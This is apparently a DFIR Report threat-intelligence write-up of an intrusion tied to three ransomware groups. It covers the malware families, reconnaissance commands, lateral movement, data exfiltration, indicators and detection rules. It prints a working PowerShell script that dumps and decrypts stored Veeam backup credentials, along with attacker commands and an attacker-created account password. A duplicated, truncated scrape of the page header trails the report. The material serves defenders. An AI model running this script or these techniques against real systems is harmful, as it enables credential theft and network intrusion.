C:\\Users\\Public\\Music\\ directory and executed via rundll32.exe, calling the exported function \u2018Reset\u2019. For instance, we also observe the threat actor executing the malicious DLL remotely via PsExec. WakeWordEngine.dll/conhost.dll processes were observed communicating with 149.28.101.219 over port 443. OSINT data identifies this IP address as associated with SystemBC infrastructure and shows it resolves to the following domains: Memory analysis found that once loaded in memory, the strings within the DLL show multiple items of interest, including the configured C2 IP and port, a user-agent, as well as references to PowerShell and ntdll.dll\u2019s LdrLoadDll function, which can be used for DLL loading: The full initial access and execution chain is captured below: ccs.exe On day six, MSBuild.exe wrote C:\\Users\\Public\\Music\\ccs.exe to disk. The ccs.exe binary was subsequently executed with MSBuild.exe as the parent process. Exiftool analysis revealed that the binary contained the following metadata, designed to impersonate Avast Antivirus: At the time of writing, ccs.exe is widely recognized as malicious in VirusTotal and was identified as Betruger backdoor by Symantec, a tool commonly used by RansomHub affiliates. According to Symantec\u2019s analysis , the Betruger backdoor incorporates functionality typically found across multiple pre-ransomware tools, consolidating various attack capabilities into a single executable. Betruger\u2019s comprehensive feature set includes screenshotting, keylogging, file exfiltration, network reconnaissance, privilege escalation, and credential harvesting. This extensive functionality suggests that Betruger was explicitly developed to streamline ransomware operations by reducing the number of distinct tools that need to be deployed on a compromised network during the preparation phase of an attack. Once executed, ccs.exe then injected itself into the memory of 172 distinct running processes. The call trace logged in Sysmon Process Access events shows ccs.exe injecting itself into these processes\u2019 memory: vhd.dll Lastly, we also observed another execution of a suspicious DLL (vhd.dll) dropped on the disk in the same staging folder of the threat actor. The threat actor used this PowerShell command to set the working directory to C:\\Users\\Public\\Music , a publicly writable folder where they had staged their malicious payloads. This allowed them to later execute VHD.dll via rundll32.exe without specifying a full path, simplifying execution and reducing the visibility of suspicious file paths in command-line logs. Upon execution, the vhd.dll would ask for a key, which is needed in order to fully execute the program. While checking the codes, we observed vhd.dll is a loader that asks for a key to decrypt a local file ( data.dat ) containing a hidden payload. Once decrypted, it executes the payload to ensure it only runs if the correct key is provided. Unfortunately, we were unable to fully attribute or deeply analyze the .DAT file to determine its specific purpose or associated malware family. Persistence Following the execution of the malicious binary EarthTime.exe, the threat actor leveraged the Windows Background Intelligent Transfer Service (BITS) to establish persistence through two coordinated activities. The first transfer involved copying the original executable to a new location at C:\\Users\\<REDACTED>\\AppData\\Roaming\\QuickAgent2\\ and renaming it to ChromeAlt_dbg.exe , likely to masquerade as a legitimate Chrome debugging utility. The second transfer created a shortcut file ChromeAlt_dbg.lnk and placed it in the C:\\Users\\<REDACTED>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory. Through the creation of this startup entry, the threat actor successfully established a persistence mechanism with ChromeAlt_dbg.lnk setup to execute the renamed Earthtime.exe file, ChromeAlt_dbg.exe . During the intrusion, the threat actor created a local account named \u201cAdmon\u201d with the password \u201cQwerty12345!\u201d using the legitimate binary net.exe on the beachhead host. Privilege Escalation The threat actor created a new local user account called \u201c Admon \u201d with the password \u201c Qwerty12345 !\u201d on the compromised system. They then added this newly created account to the local Administrators group, giving themselves full administrative privileges on the machine. The threat actors leveraged Microsoft Sysinternals\u2019 PsExec utility for local privilege escalation on the compromised host. By utilizing the \u201c-s\u201d parameter, the adversaries were able to execute malicious binaries with SYSTEM-level privileges, effectively escalating from their initial user-level access to the highest administrative privileges on the Windows system. Defense Evasion During the initial access malware execution a SectopRAT binary was written to %AppData%\\Local\\Temp as bhnwcwgaphpge. This was then injected into the MSBuild.exe process to run the malware. Two of the binaries observed in this attack were masquerading as products from well-known and reputable security vendors. The first binary, GT_NET.exe is associated with Grixba, a custom data-gathering tool used by the Play ransomware group. Its metadata was crafted to impersonate SentinelOne security software, complete with fake product names, descriptions, and copyright information referencing \u201cSentinel Labs, Inc.\u201d The team from Field Effect also noticed this, as per their blog back in January of this year. The second binary, ccs.exe contains the Betruger backdoor commonly deployed by RansomHub affiliates. This malware was designed with extensive metadata mimicking Avast Antivirus, including legitimate-appearing product names, version numbers, and copyright information. The threat actors even used a filename convention (\u201caswAvBootTimeScanShMin.exe\u201d) that closely resembles authentic Avast components. We also observed the threat actor attempting to disable Windows Defender\u2019s security features by modifying critical registry keys on the domain controller and backup server. Examining the registry events reveals a step-by-step approach to disable multiple Windows Defender registry keys, including real-time scanning, behavior monitoring, anti-spyware detection, and network protection. These registry changes focused on the Windows Defender policy area ( HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\ ), showing the threat actor wanted to make system-wide security changes that would last through reboots and affect all users. By targeting the policy registry instead of user-specific settings, the threat actor made sure they had maximum impact while keeping their changes in place during their attack. Lastly, the theater actor performed potentially time-stomping activities by manipulating the metadata of the ExportData.db file, which contained the scan results, by executing the \u201cGT_NET.exe\u201d binary. This timestomping occurred immediately after GT_NET.exe created the ExportData.db file, which suggests the threat actor attempts to cover its tracks by automatically changing the timestamps of its created files. The choice of a future date (2037) is particularly telling \u2013 it\u2019s far enough from the actual attack time frame to potentially throw off forensic analysis that relies on file timestamps to understand the sequence of events. Below is the sequence of events by looking at Sysmon Event ID 2. Credential Access The threat actor employed various methods to access credentials throughout this intrusion, including information stealers, Veeam database credential dumping, DCSync attacks, and the deployment of Betruger backdoor malware. Information Stealers YARA scans on memory dumps from the beachhead returned various hits for Arechclient malware (aka SectopRAT) with the following signature: Windows.Trojan.Arechclient2 SectopRAT is widely known to have information-stealing capabilities, which are on display in the strings from this particular dump. The strings reference scans for various services, including Steam, Discord, Telegram, web browsers, and crypto wallets, which is textbook infostealer activity. Veeam Database Credential Dumping Windows Event ID 4104 from the Microsoft-Windows-PowerShell/Operational log is generated by PowerShell\u2019s script block logging feature, which records the execution of PowerShell scripts. This artifact revealed that the threat actor executed a script on the backup server to extract credentials from a Veeam database. The script contains multiple sections, which have been broken down into smaller parts for better readability. The first section queries the Windows Registry for SQL Server instances and targets a hardcoded database named \u201cVeeamBackup\u201d. The $SQLQuery variable was configured to retrieve the top 1000 rows from the Credentials table within the VeeamBackup database: \"# SQL Server and database\\\\\" $hostname = hostname \"$SQLInstances = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server').InstalledInstances\" \"$SQLServer = \\\"$hostname\\\\$SQLInstances\\\" #use Server\\\\Instance for named SQL instances! \" \"$SQLDBName = \\\"VeeamBackup\\\"\" \"# SQL Query\" \"$SqlQuery = \\\"SELECT TOPdatabase (1000) [id],[user_name],[password],[usn],[description],[visible],[change_time_utc]FROM [VeeamBackup].[dbo].[Credentials]\\\"\" The next section of the script establishes a connection to the SQL Server database, executes the query stored in the $SQLQuery variable, stores the results in a dataset, and then closes the connection: \"# Connection string \" $SqlConnection = New-Object System.Data.SqlClient.SqlConnection \"$SqlConnection.ConnectionString = \\\"Server = $SQLServer; Database = $SQLDBName; Integrated Security = True\\\" $SqlCmd = New-Object System.Data.SqlClient.SqlCommand $SqlCmd.CommandText = $SqlQuery $SqlCmd.Connection = $SqlConnection $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter $SqlAdapter.SelectCommand = $SqlCmd $Result= New-Object System.Data.DataSet $SqlAdapter.Fill($Result) \"#Close the connection \" $SqlConnection.Close() The next section of the script was used to convert DataTable rows to PowerShell objects: $MyArray = ForEach ($Row in $Result.Tables[0].Rows) { $Record = New-Object PSObject ForEach ($Col in $Result.Tables[0].Columns.ColumnName) { Add-Member -InputObject $Record -NotePropertyName $Col -NotePropertyValue $Row.$Col } $Record } The final section of the script contains a for loop that performs the following actions: Iterates through each item in the $MyArray variable Loads the DLL Veeam.Backup.Common.dll (required to access the class needed for password decryption) Uses Veeam\u2019s ProtectedStorage class to decrypt the encoded passwords Displays usernames, decrypted passwords, and descriptions to the console for ($i = 0; $i -lt $MyArray.Length; $i++) { Add-Type -Path \"C:\\Program Files\\Veeam\\Backup and Replication\\Backup Catalog\\Veeam.Backup.Common.dll\" $encoded = $MyArray.password[$i] $pass = [Veeam.Backup.Common.ProtectedStorage]::GetLocalString($encoded) Write-Host \"==================\" Write-Host \"user_name: \" $MyArray.user_name[$i] Write-Host \"password: \" $pass Write-Host \"description:\" $MyArray.description[$i] Write-Host \"==================\" DCSync Credentials were also dumped via a DCSync attack using a privileged account. The activity was observed in Windows Security Event ID 4662, with clear indicators including a non-computer-based account, an access mask of 0x100, and the following object ID: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} = DS-Replication-Get-Changes Betruger Backdoor As outlined in the Command and Control section of this report, the file hash for the executable C:\\Users\\Public\\Music\\ccs.exe returned a direct match for the Betruger backdoor. According to research conducted by the Symantec team, this backdoor is multifunctional and includes modules designed for credential dumping. The backdoor accessed the LSASS process memory to harvest credentials, which was observed through a Sysmon process access event showing a GrantedAccess value of 0x1410 . Discovery Local system discovery The initial execution of MSBuild.exe on the beachhead led to the discovery of commands such as ipconfig , nslookup and net localgroup . Below is the illustration of the execution chain involving multiple Windows built-in commands abused by the threat actor. On day six of the intrusion, additional discovery and reconnaissance commands were executed on the compromised beachhead host. These commands were spawned as child processes of the Betruger ccs.exe process and included whoami for identity verification, net user and net group for local and domain user enumeration, nltest for domain trust relationship analysis, and ping for network connectivity testing. The cmd.exe process spawned by Betruger also wrote several suspicious hidden files indicative of discovery in the user\u2019s Downloads directory, which was also the CurrentDirectory: Network Scanning During the intrusion, the threat actor two versions of the Grixba tool. Grixba is a custom tool reportedly used by Play Ransomware that scans computer networks to find users, computers, and installed software using built-in Windows tools like WMI and WinRM. It specifically looks for security programs, antivirus software, backup tools, and office applications for reconnaissance purposes. An analysis of a Grixba sample revealed the following help message and functionality: During day two of the intrusion, the threat actor deployed the Grixba reconnaissance tool ( GT_NET.exe ) on the compromised backup server. The malware was executed through a cmd.exe parent process using the command line. GT_NET.exe -m:scan -i:f -d:list.txt Here\u2019s the command line options breakdown: -m:scan - Sets the mode/method to scan. -i:f - Input parameters set to \"f\" (file) -d:list.txt - Destination parameter pointing to list.txt. Can be used to load target IPs. GT_NET.exe generated 3,861 internal DNS queries and established 186 network connections during its execution. The majority of connections targeted destination port 135 (Microsoft RPC), with additional connections to port 389 (LDAP) and various high-numbered ephemeral ports ranging from 49666 to 63964. The creation of data.zip and ExportData.db files align with behavioral indicators documented by Field Effect\u2019s research on Grixba malware in their published analysis. Another network scanning tool used was the SoftPerfect tool netscan.exe, which was executed on the domain controller from the path C:\\Users\\Public\\Music\\123\\123\\netscan.exe and scanned ports 135 (RPC), 445 (SMB) and 3389 (RDP) across 46 IP addresses. During the netscan execution on the domain controller, we observed the creation of a file called delete.me on the C$ share of the beachhead workstation, logged by Event ID 5145. This activity has been previously observed related to netscan.exe when the \u2018Check for write access\u2019 option is enabled, as detailed in previous reports: https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware and https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours Prior to the execution of netscan.exe, we also observed the threat actors creating netscan.xml in the same directory as the executable. This file was retrieved for analysis, and inspecting its contents shows the checkwrite flag was indeed enabled: Digging into the netscan.xml config file, it\u2019s clear that the threat actors tweaked it to suit their needs, with a big focus on using PsExec to run scripts remotely. This setup enables them to deploy batch files, such as newuser.bat, openrdp.bat, and start.bat across the network. This opens the door to tasks like setting up new user accounts, enabling RDP access, and deploying additional malicious payloads. While examining the files associated with NetScan, we observed one output file with a filename matching the name of a company, potentially indicating a victim of this threat actor. Based on OSINT data, this organization has been compromised by DragonForce, as evidenced by their company profile being posted on DragonForce\u2019s data leak site (DLS). The third and final tool used for network scanning was GRB_NET.exe (another version of Grixba). This was executed on the domain controller from two different paths using different command line arguments: Upon execution, GRB_NET.exe initiated extensive network reconnaissance by generating 1,373 DNS A record queries to enumerate internal domain hosts and establishing 145 network connections. These connections primarily targeted port 135 (Microsoft RPC) and port 389 (LDAP) for service enumeration, along with ephemeral ports in the range 49666-51508. Following the reconnaissance phase, the malware created an archive file C:\\Users\\Public\\Music\\export.zip likely containing the collected data. GRB_NET.exe is unsigned and recognized as malicious by 10 vendors in VirusTotal. Active Directory Discovery On day two of the intrusion, the threat actors executed SharpHound (disguised as sh.exe ) on the domain controller from the directory C:\\PerfLogs\\ . This Active Directory reconnaissance tool was launched with the command line parameters shown below. Binary analysis confirmed the executable\u2019s metadata identifies it as a renamed SharpHound binary, which also indicates evasion tactics. When executed, sh.exe made 1,271 internal DNS A requests, as well as the following network connections, all of which triggered the Sigma rule \u2018Network Connection Initiated From Process Located In Potentially Suspicious Or Uncommon Location\u2019: sh.exe also wrote the following files, indicative of BloodHound/SharpHound execution. The writing of these files triggered the following Sigma rules: \u2018BloodHound Collection Files\u2019 \u2018Suspicious File Created in PerfLogs\u2019 \u2018Windows Shell/Scripting Application File Write to Suspicious Folder\u2019 The threat actor conducted additional Active Directory reconnaissance using the ADFind enumeration tool ( Adfind.exe ), which was staged in the C:\\Users\\Public\\Music\\ directory. The threat actor executed the command with the \u201c-subnets\u201d parameter to query the CN=Subnets,CN=Sites,CN=Configuration partition, where Active Directory stores subnet-to-site mappings and network topology information. PowerShell Script Block logging from the Domain Controller (event code 4104) shows the following Get-ADComputer command was imported and then executed to enumerate Active Directory computer objects and output them to a CSV file: Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *|select comment, description, Name, DNSHostName, OperatingSystem, LastLogonDate, ipv4address | Export-CSV C:\\Users\\Public\\Music\\AllWindows.csv -NoTypeInformation -Encoding UTF8 Other discovery commands executed on the Domain Controller and observed in the PowerShell Script Block logging include: nltest /domain_trusts /all_trusts nltest /dclist: net group \"Domain Admins\" /domain File Discovery Prior to the archiving stage, we observed the threat actor accessing the contents of multiple files using wordpad.exe , primarily on the file server as part of their discovery phase. On two occasions, the threat actor pivoted to the backup server to view and access files on the shared drives. This demonstrates the lateral movement capabilities and network discovery, which indicates the threat actor had gained extensive knowledge of the organization\u2019s infrastructure and understood how to navigate between systems to access sensitive data efficiently. One notable document sought out and opened by the threat actor was an insurance policy document covering cyber intrusions. Where zipped files were found, these were opened using WinRAR: \"C:\\Program Files\\WinRAR\\WinRAR.exe\" x -iext -ow -ver -imon1 \u2013 \"F:\\Shares\\<redacted>\\<redacted>\\<redacted>.zip\" F:\\Shares\\<redacted>\\<redacted>\\<redacted>\\ Lateral Movement The Remote Desktop Protocol (RDP) and Impacket\u2019s wmiexec were used throughout this intrusion to facilitate lateral movement. Remote Desktop Protocol The adversary primarily relied on Remote Desktop Protocol (RDP) for lateral movement throughout the compromised network. Analysis of Windows security logs revealed a consistent pattern where logon type 3 (network) events were immediately followed by logon type 10 (remote interactive) events, which is characteristic of RDP authentication sequences. This specific logon pattern was likely facilitated by SystemBC malware\u2019s proxy capabilities, which enabled the threat actor to establish RDP connections through compromised systems. Notably, the Windows security event logs disclosed the host names of the threat actor\u2019s workstations: (note the apparent typo in \u201cDESCTOP\u201d in one instance). DESCTOP-QPITRY DESKTOP-A1HRTMJ DESKTOP-PGD76HT WIN-FLGU1CC210K Impacket On day six, the threat actor used wmiexec from the Impacket suite to remotely execute various enumeration commands on the domain controller. The parent-child relationship between WmiPrvSE.exe and cmd.exe, combined with the characteristic output redirection to administrative shares, provides a clear signature of wmiexec usage. The commands executed behave as typical post-exploitation reconnaissance activities, with particular focus on enumerating specific user accounts and understanding the current user session. Betruger After the deployment of the Betruger backdoor on day six, multiple Windows Event IDs 4776 (credential validation) were observed, indicating successful network authentication attempts against the beachhead system. The source workstation associated with these authentication events WIN-FLGU1CC210K had not been observed in any previous activity during this intrusion. Based on the timing correlation with Betruger deployment and the sudden appearance of this previously unseen hostname, we assess with high confidence that this represents an additional workstation under threat actor control. Collection WinRAR.exe was brought into the victim environment for collection purposes. On day two, during a period of the threat actor\u2019s activity and under a compromised user context, explorer.exe created C:\\Users\\Public\\Music\\winrar-x64-611.exe . This binary was then executed and wrote the file C:\\Program Files\\WinRAR\\WinRAR.exe to disk. The threat actor then used WinRAR.exe to zip victim files on the file share prior to exfiltration. They systematically archived six high-value directories, before performing additional archiving operations on specific files, e.g. \"C:\\Program Files\\WinRAR\\WinRAR.exe\" a -ep1 -scul -r0 -iext -imon1 -- . F:\\Shares\\REDACTED\\REDACTED The threat actor also deployed a tool named FS64.exe , a custom tool designed for automating file collection. During execution, the threat actor specifies the drive or directory from which to collect files, and the tool outputs a .txt file containing the list of collected files. It was executed on the backup server, targeting a remotely mounted share on the file server. The process wrote the file __<redacted_fileserver_ip>_F$_Shares.txt as well as copying multiple .xls, .xlsx, .doc., .docx, .pdf files to the C:\\Users\\Public\\Music\\ directory. Winrar.exe was also used to extract WinSCP.rar in preparation for exfiltration. We also discovered a WinSCP.ini configuration file used by the WinSCP application. The threat actor utilized WinSCP to perform data exfiltration, as detailed in the Exfiltration section of this report. This WinSCP configuration reveals that the threat actor configured a custom file mask targeting a wide range of file types, including web content ( .html , .php , .js , .css ), configuration files ( .cfg , .ini , .htaccess ), and scripts/source code ( .sh , .pl , .c , .cpp ). This selective file mask indicates an intent to specifically identify and exfiltrate files containing website content, credentials, or source code rather than indiscriminately copying all available files. Command and Control Three separate Command and Control channels were observed: SectopRAT, SystemBC, and Betruger. SectopRAT The following Surricata rules triggered on the network traffic, once SectopRAT injected itself into the MSBuild.exe process for IP address 45.141.87[.]55. This IP was tracked by the DFIR Report Threat Intelligence Group as an active SectopRAT C2 server from August 8th 2024 through November 23rd 2024. The rule \u201c ET MALWARE Arechclient2 Backdoor/SecTopRAT CnC Init \u201d fired when network traffic to the destination port 15647 was detected. Initiated: true \u00a6 Proto: tcp \u00a6 SrcIP: 10.X.X.X \u00a6 TgtIP: 45.141.87[.]55 \u00a6 TgtPort: 15647 \u00a6 Proc: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe The second rule \u201c ET MALWARE Arechclient2 Backdoor/SecTopRAT Related Activity M2 (GET) (SID 2052248) \u201d fired when C2 beaconing activity to destination port 9000 was observed. Initiated: true \u00a6 Proto: tcp \u00a6 SrcIP: 10.X.X.X \u00a6 TgtIP: 45.141.87[.]55 \u00a6 TgtPort: 9000 \u00a6 Proc: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe SystemBC Shortly after the command-and-control (C2) channel was established via the SectopRAT malware, a new file named WakeWordEngine.dll (also observed later in the intrusion named conhost.dll) was created on the beachhead host. This file was identified as the SystemBC tool, which is commonly leveraged for its proxying and tunneling capabilities. The threat actor used SystemBC to establish a tunnel, enabling Remote Desktop Protocol (RDP) access via proxy connections. This allowed them to pivot into the internal network from external systems, facilitating further post-compromise activity within the environment. The following Sigma rule triggered once the tunnel was established \u201cOutbound RDP Connections Over Non-Standard Tools\u201d. Initiated: true \u00a6 Proto: tcp \u00a6 SrcIP: 10.X.X.X \u00a6 SrcPort: 62105 \u00a6 TgtIP: 10.65.45[.]223 \u00a6 TgtPort: 3389 \u00a6 Proc: C:\\Windows\\SysWOW64\\rundll32.exe The activity exposed the client names of the computers used by the threat actor. During the intrusion, the following client names were observed: DESKTOP-A1HRTMJ, DESKTOP-PGD76HT, DESCTOP-QPITRY (sic) and WIN-FLGU1CC210K Betruger On the fifth day of intrusion, we observed that the SectopRAT process created a new binary, ccs.exe. This particular binary has been identified as Betruger, a multi-function backdoor which appears to have been explicitly developed for carrying out ransomware attacks. This custom backdoor has been seen used by affiliates of RansomHub. Once executed, it will reach out to its command and control infrastructure, which was 504e1c95.host.njalla[.]net . Based on OSINT, the 504ec1c95.host.njalla[.]net has been classified as a phishing domain. Based on Symantec\u2019s analysis , the file was identified as the Betruger malware, a multi-functional backdoor. The malware established command and control (C2) communication over multiple IP addresses using ports 80 and 443. Exfiltration On day two of the intrusion, the threat actor began preparing for data exfiltration on the file server. The threat actor conducted systematic data archiving as part of their data staging phase before the main data exfiltration activities, as described in the Collection section of this report. Immediately after, the threat actors initiated outbound network traffic to the IP address 144.202.61.209 using WinsCP via File Transfer Protocol (FTP), efficiently exfiltrating the staged files for approximately 15 minutes. Due to the threat actor\u2019s use of the unencrypted FTP protocol rather than SFTP for data exfiltration, packet capture analysis from the file server revealed compromising evidence of the threat actor\u2019s activities in clear text, including their credentials. Based on the Wireshark capture below, the threat actor connected to an FTP server and began uploading the RAR files they created during data staging, starting with \u201cMDTM **** IT.part1.rar\u201d. The session shows them navigating directories using standard FTP commands (PWD, CWD) and switching between ASCII and binary transfer modes for optimal file transmission. The capture reveals systematic exfiltration of archived organizational data, including attempts to upload \u201cFinance.rar\u201d and other sensitive files they had previously compressed. Impact While no ransomware was deployed before the adversary was evicted from the environment, the threat actor ultimately achieved one of their primary objectives, successfully exfiltrating data from the network. Based on the actions performed by the adversary during this intrusion and the tactics, techniques, and procedures (TTPs) observed throughout the campaign, we assess with high confidence that this was an active ransomware affiliate likely working with various ransomware-as-a-service (RaaS) providers. Based on the analysis of these intrusion events, we identified multiple indicators linked to three distinct ransomware groups. The detailed attribution matrix is as follows. Observed TTPs Group Category Grixba (GT_Net.exe) Play Malware Binary Grixba (GRB_NET.exe) Play Malware Binary Payload staging under C:\\Users\\Public\\Music directory RansomHub Persistence/Staging Betruger Backdoor (ccs.exe) RansomHub Backdoor Usage of BitsAdmin RansomHub LOLBins REDACTED.xml (Netscan output file from another victim) DragonForce Discovery SystemBC (wakewordengine.dll | conhost.dll) Play + DragonForce C2/Proxy Mlaware Impacket (wmiexec) Play + RansomHub Lateral Movement / Credential AccessP NetScan, ADFind, WinRAR, WinSCP, PSExec Play + RansomHub + DragonForce Post-Exploitation Tools Timeline Diamond Model Indicators Atomic 45.141.87.55 - MSBuild.exe C2 (SectopRAT) 149.28.101.219 - WakeWordEngine.dll/conhost.dll (SystemBC) 504e1c95.host.njalla[.]net - ccs.exe (Betruger) 80.78.28.149 - ccs.exe (Betruger) 144.202.61.209 - TA's FTP server Computed earthtime.exe 71f703024c3d3bfc409f66bb61f971a0 f24fc14f39c160b54dc3b2fbd1eba605ec0eb04f bcff246f0739ed98f8aa615d256e7e00bc1cb24c8cabaea609b25c3f050c7805 wakewordengine.dll / conhost.dll e963d598a86c5ee428a2eefa34d1ffbb 142294249feb536e0edbe6e2de3eb3c3415ecf39 6f9326224e6047458e692cd27aeb1054b9381c67aaf2fe238dbebfbc916c4b33 ccs.exe (Betruger) 5675a7773f6d3224bfefdc01745f8411 c0e5e4b5fcbd0a30b042e602d99a6ee81ad5d8d7 ae7c31d4547dd293ba3fd3982b715c65d731ee07a9c1cc402234d8705c01dfca fs64.exe c6f92d1801d7d212282a6dd8f11b44fe d15d45d9d9a8ef7a9f048d74b386f620f3b82576 e1521e077079032df974c7ae39e4737cdb4f05c6ded677ed5446167466eeb899 vhd.dll 95c96de7dcb5a643559ac66045559cc9 68b6d0cc1430e2d4f70e2ba5026d1c4847324269 a4bc6bebabb52ed9816987b77ebae6ef70e174533a643aea6265bdf1ed9b8952 gt_net.exe abb2a6a0f771ab20ce2037d2c4ef5783 ac0fcbc148e45e172c9be0acf9c307186f898803 aeaf7cc7364a44b381af9f317fe6f78c2717217800b93bee8839ab3e56233254 grb_net.exe 88df27b6e794e3fd5f93f28b1ca1d3d0 2114d655805f465d11b720830d150c145039bcd4 f8810179ab033a9b79cd7006c1a74fbcde6ed0451c92fbb8c7ce15b52499353a adfind.exe 12011c44955fd6631113f68a99447515 4f4f8cf0f9b47d0ad95d159201fe7e72fbc8448d c92c158d7c37fea795114fa6491fe5f145ad2f8c08776b18ae79db811e8e36a3 sh.exe 829a9dfd2cdcf50519a1cec1f529854b 5bf41754bfb3a18611b2a02f7f385960ed24f8e1 a7240d8a7aee872c08b915a58976a1ddee2ff5a8a679f78ec1c7cf528f40deed netscan.exe 27f7186499bc8d10e51d17d3d6697bc5 52332ce16ee0c393b8eea6e71863ad41e3caeafd 18f0898d595ec054d13b02915fb7d3636f65b8e53c0c66b3c7ee3b6fc37d3566 Detections Network ET MALWARE Arechclient2 Backdoor/SecTopRAT Related Activity M2 (GET) ET MALWARE Arechclient2 Backdoor/SecTopRAT CnC Init ThreatFox SectopRAT botnet C2 traffic (ip:port - confidence level: 100%) ET MALWARE Arechclient2 Backdoor/SecTopRAT Related Activity ET INFO Suspected Impacket WMIExec Activity Sigma Search rules on detection.fyi or sigmasearchengine.com DFIR Private Rules: 85d1ebcc-0145-4033-a344-f9f3a4dd03ac : Sharphound File Writes 932dd739-3672-458e-b362-b3cedba992ba : Grixba Reconnaissance Tool Execution 97350071-6934-4d1e-863d-23b7f51fb17d : SharpHound Active Directory Enumeration Tool Execution Sigma Repo: 17d619c1-e020-4347-957e-1d1207455c93 : Active Directory Replication from Non Machine Account b85e5894-9b19-4d86-8c87-a2f3b81f0521 : BITS Transfer Job Downloading File Potential Suspicious Extension 6d44fb93-e7d2-475c-9d3d-54c9c1e33427 : BITS Transfer Job With Uncommon Or Suspicious Remote TLD 02773bed-83bf-469f-b7ff-e676e7d78bab : BloodHound Collection Files f376c8a7-a2d0-4ddc-aa0c-16c17236d962 : HackTool \u2013 Bloodhound/Sharphound Execution 611eab06-a145-4dfa-a295-3ccc5c20f59a : Mimikatz DC Sync 7b434893-c57d-4f41-908d-6a17bf1ae98f : Network Connection Initiated From Process Located In Potentially Suspicious Or Uncommon Location ed74fe75-7594-4b4b-ae38-e38e3fd2eb23 : Outbound RDP Connections Over Non-Standard Tools cf879ffb-793a-4753-9a14-bc8f37cc90df : Potential Qakbot Rundll32 Execution 3dfd06d2-eaf4-4532-9555-68aca59f57c4 : Process Execution From A Potentially Suspicious Folder 304afd73-55a5-4bb9-8c21-0b1fc84ea9e4 : PSEXEC Remote Execution File Artifact 7c0dcd3d-acf8-4f71-9570-f448b0034f94 : PsExec Service Child Process Execution as LOCAL SYSTEM 9a132afa-654e-11eb-ae93-0242ac130002 : PUA \u2013 AdFind Suspicious Execution b447f7de-1e53-4cbf-bfb4-f1f6d0b04e4e : Suspicious Binaries and Scripts in Public Folder bbb7e38c-0b41-4a11-b306-d2a457b7ac2b : Suspicious File Created In PerfLogs 1277f594-a7d1-4f28-a2d3-73af5cbeab43 : Windows Shell/Scripting Application File Write to Suspicious Folder Yara MALPEDIA_Win_Systembc_Auto DITEKSHEN_MALWARE_Win_EXEPWSH_Dlagent TELEKOM_SECURITY_Win_Systembc_20220311 EXT_MAL_SystemBC_Mar22_1 ELASTIC_Windows_Trojan_Systembc_C1B58C2F SUSP_XORed_URL_In_EXE DITEKSHEN_MALWARE_Win_Arechclient2 ELASTIC_Windows_Trojan_Redlinestealer_15Ee6903 ELASTIC_Windows_Generic_Threat_2Ae9B09E MITRE ATT&CK Additional Local or Domain Groups - T1098.007 Archive via Utility - T1560.001 Automated Collection - T1119 Create Account - T1136 Credentials from Password Stores - T1555 DCSync - T1003.006 Disable or Modify Tools - T1562.001 Domain Account - T1087.002 Domain Groups - T1069.002 Domain Trust Discovery - T1482 Exfiltration Over Alternative Protocol - T1048 File and Directory Discovery - T1083 Group Policy Discovery - T1615 Lateral Tool Transfer - T1570 Local Account - T1087.001 Local Account - T1136.001 Local Groups - T1069.001 LSASS Memory - T1003.001 Malicious File - T1204.002 Masquerading - T1036 MSBuild - T1127.001 Network Service Discovery - T1046 Network Share Discovery - T1135 Obfuscated Files or Information - T1027 PowerShell - T1059.001 Protocol Tunneling - T1572 Proxy - T1090 Registry Run Keys / Startup Folder - T1547.001 Remote Desktop Protocol - T1021.001 Remote System Discovery - T1018 Service Execution - T1569.002 System Network Configuration Discovery - T1016 Timestomp - T1070.006 Web Protocols - T1071.001 Windows Command Shell - T1059.003 Windows Management Instrumentation - T1047 Windows Service - T1543.003 Internal Case #TB32034 #PR37389 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira From a Single Click: How Lunar Spider Enabled a Near Two-Month Intrusion Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "filtered_content": "Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts dragonforce play ransomhub sectoprat Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs September 8, 2025 Key Takeaways The intrusion began when a user downloaded and executed a malicious file impersonating DeskSoft\u2019s EarthTime application but instead dropped SectopRAT malware. The threat actor deployed multiple malware families, including SystemBC for proxy tunneling, and later Betruger backdoor for additional capabilities. They leveraged various tools such as AdFind, SharpHound, SoftPerfect NetScan, and GT_NET.exe (Grixba) to map out the environment and perform reconnaissance activities. Lateral movement was primarily accomplished through RDP connections, with additional use of Impacket\u2019s wmiexec. The threat actor moved across multiple systems, including domain controllers, backup servers, and file servers, while maintaining persistence through local account creation and startup folder shortcuts. Data collection and exfiltration were performed using WinRAR to compress targeted file shares containing sensitive business documents, which were then transferred via WinSCP to an FTP server hosted by a cloud provider in clear text. The discovery of Grixba (a 